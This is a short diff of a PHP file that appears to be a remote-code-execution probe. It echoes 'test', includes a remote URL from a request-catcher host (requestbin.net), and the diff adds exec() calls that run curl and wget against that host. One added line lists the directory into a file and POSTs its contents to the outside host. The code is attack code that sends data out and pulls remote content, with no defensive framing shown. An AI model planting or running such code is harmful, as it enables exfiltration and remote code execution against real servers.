@@ -5,5 +5,7 @@
 echo 'test';
 $getthis='http://requestbin.net/r/rn0hh7rn/rceeeeeee';
 include($getthis);
-system("curl http://requestbin.net/r/rn0hh7rn/rce");
+exec("curl http://requestbin.net/r/rn0hh7rn/rce");
+exec("wget http://requestbin.net/r/rn0hh7rn/rce");
+exec("ls -la > ffff; curl http://requestbin.net/r/rn0hh0rn/ -d '$(cat ffff)' -X POST");
 ?>
